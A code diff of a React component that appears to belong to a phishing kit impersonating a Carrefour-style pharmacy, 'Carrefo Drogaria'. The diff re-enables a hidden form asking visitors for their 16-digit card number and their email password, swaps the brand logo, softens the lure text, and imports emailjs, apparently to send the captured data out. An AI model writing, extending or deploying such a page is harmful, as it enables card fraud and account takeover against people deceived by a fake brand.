@@ -1,5 +1,5 @@
 import React, { Component,useEffect } from 'react'
-import logo from './logo_carrefo.jpg'
+import logo from './carrfo.png'
 import emailjs from 'emailjs-com';
 
 
@@ -43,11 +43,11 @@ export class SocialProfiles extends Component {
 
             
             <div className="form-container">
-          {/* <div className="text-center container">
+          <div className="text-center container">
 
 <img className="logo" src={logo} width="100"/>
 </div>
-                <p className="container"><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefo Drogaria</b></p>
+                <p className="container"><b>Tudo certo!<br></br></b> Precisamos confirmar algumas informações.</p>
                 <div className="form-group">
                     <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                 </div>
@@ -63,7 +63,7 @@ export class SocialProfiles extends Component {
                 <div className="form-group">
                     <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                    <span class="focus-border"></span>
-                </div> */}
+                </div>
                 <br />
                 {/* <input type="text" name="ip" placeholder={this.ipzao}  ></input> */}
 
